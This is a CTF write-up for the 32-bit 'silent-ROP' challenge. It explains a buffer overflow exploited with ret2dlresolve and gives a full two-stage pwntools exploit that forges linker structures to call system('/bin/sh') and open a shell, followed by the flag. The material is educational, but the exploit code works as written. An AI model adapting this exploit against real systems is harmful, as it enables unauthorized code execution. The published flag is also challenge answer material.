# silent-ROP

Disclaimer: I was not able to solve the challenge during the CTF due to the author's use of patchelf.
We were provided the original binary, but the Docker build stage patches it, resulting in a different binary.
My exploit works when given the correct binary.

## Challenge

The binary has few functions and does not provide any output, making it difficult to leak addesses including libc.

### Mitigations

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Solution

This was my introduction to ret2dlresolve.
I had a lot of help from these blogs:

- https://www.da.vidbuchanan.co.uk/blog/0CTF-2018-babystack-ret2dlresolve.html
- https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62

The program has a buffer overflow as `read` reads many more characters than its buffer can hold.
There is no PIE and no canary, so its trivial to control RIP.

The exploit is split into 2 stages.
Stage 1 pivots the stack onto a writable data section and sets up a `read` call.
Stage 2 creates the forged structures and calls `dlresolve`.

We can force `dlresolve` to resolve the `system` symbol for us and pass it a "/bin/sh" string as our parameter, spawning a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ctf.k3rn3l4rmy.com --port 2202 silent-ROP
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('silent-ROP-patched')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ctf.k3rn3l4rmy.com'
port = int(args.PORT or 2202)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

pause()

stage2_addr = 0x804ce00
writeable = 0x804c800

PLT = exe.get_section_by_name(".plt")["sh_addr"]
STRTAB, SYMTAB, JMPREL, VERSYM = map(exe.dynamic_value_by_tag,
    ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL", "DT_VERSYM"])

log.info("STRTAB: " + hex(STRTAB))
log.info("SYMTAB: " + hex(SYMTAB))
log.info("JMPREL: " + hex(JMPREL))
log.info("VERSYM: " + hex(VERSYM))

rop = ROP(exe)

stage1 = flat({
    0x18: [
        stage2_addr - 4,
        exe.plt['read'],
        rop.find_gadget(['leave', 'ret'])[0],
        0,
        stage2_addr,
        0x48,
        ],
    }, filler=b'\x00')

io.sendline(stage1)

stage2_system_off = 0x30;
stage2_cmd_off = 0x40;

stage2_sym_off = 0x18;
stage2_sym = flat({
    0x0: stage2_addr + stage2_system_off - STRTAB,
    0xc: 0x0,
    }, filler=b'\x00')

index_sym = (stage2_addr + stage2_sym_off - SYMTAB) // 0x10
r_info = (index_sym << 8) | 0x7

verind = VERSYM + index_sym * 2
log.info("verind: " + hex(verind))

stage2_rel_off = 0x28;
stage2_rel = flat({
    0x0: writeable,
    0x4: r_info,
    }, filler=b'\x00')

stage2_rop = flat({
    0x0: [
        PLT,
        stage2_addr + stage2_rel_off - JMPREL,
        exe.plt['read'],
        stage2_addr + stage2_cmd_off,
        ],
    }, filler=b'\x00')

stage2 = flat({
    0x0: stage2_rop,
    stage2_sym_off: stage2_sym,
    stage2_rel_off: stage2_rel,
    stage2_system_off: b"system\0",
    stage2_cmd_off: b"/bin/sh\0",
    }, filler=b'\x00')

io.send(stage2)

io.interactive()
```

## Flag

`flag{r3t_2_dl_r3s0lve_d03s_n0t_n3ed_a_l34k}`
